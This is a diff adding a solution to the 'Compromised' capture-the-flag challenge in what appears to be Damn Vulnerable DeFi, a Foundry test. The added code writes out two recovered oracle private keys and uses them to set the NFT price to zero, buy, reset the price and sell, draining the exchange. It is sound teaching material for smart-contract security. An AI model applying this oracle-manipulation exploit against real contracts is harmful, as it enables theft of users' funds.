@@ -22,8 +22,8 @@ contract CompromisedChallenge is Test {
 
 
     address[] sources = [
-        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
-        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
+        0x188Ea627E3531Db590e6f1D71ED83628d1933088, // private-key: 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744 (from 1st data)
+        0xA417D473c40a4d42BAd35f147c21eEa7973539D8, // private-key: 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159 (from 2nd data)
         0xab3600bF153A316dE44827e2473056d56B774a40
     ];
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
@@ -73,9 +73,24 @@ contract CompromisedChallenge is Test {
 
     /**
      * CODE YOUR SOLUTION HERE
+     * 
+     * The key is to convert that weird looking data into a `ascii` format first, this will give you the private key. We can also try to convert that private key to a public key using `cast wallet address --private-key <private-key>` command.
      */
     function test_compromised() public checkSolved {
-        
+        setPrices(0);
+
+        vm.prank(player);
+        exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+
+        setPrices(INITIAL_NFT_PRICE);
+
+        vm.startPrank(player);
+
+        nft.approve(address(exchange), 0);
+        exchange.sellOne(0);
+
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
     }
 
     /**
@@ -93,5 +108,19 @@ contract CompromisedChallenge is Test {
 
         // NFT price didn't change
         assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
+    }
+
+    function setPrices(uint256 _price) private {
+        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159; 
+
+        address source1 = vm.addr(privateKey1);
+        address source2 = vm.addr(privateKey2);
+
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", _price);
+
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", _price);
     }
 }
